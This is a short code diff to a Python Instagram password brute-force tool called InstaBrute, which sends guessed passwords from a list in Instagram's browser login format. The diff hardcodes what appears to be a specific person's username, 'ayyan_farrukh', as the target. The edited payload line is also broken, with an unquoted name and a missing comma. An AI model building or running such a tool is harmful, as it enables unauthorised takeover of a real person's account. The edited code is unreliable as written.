@@ -42,7 +42,7 @@ class InstaBrute(object):
     def __init__(self):
 
         try:
-            user = input('username : ')
+            user = input('ayyan_farrukh : ')
             Combo = input('passList : ')
             print('\n----------------------------')
           
@@ -76,7 +76,7 @@ class InstaBrute(object):
         time = int(datetime.now().timestamp())
 
         payload = {
-            'username': user,
+            'username': ayyan_farrukh
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
             'queryParams': {},
             'optIntoOneTap': 'false'
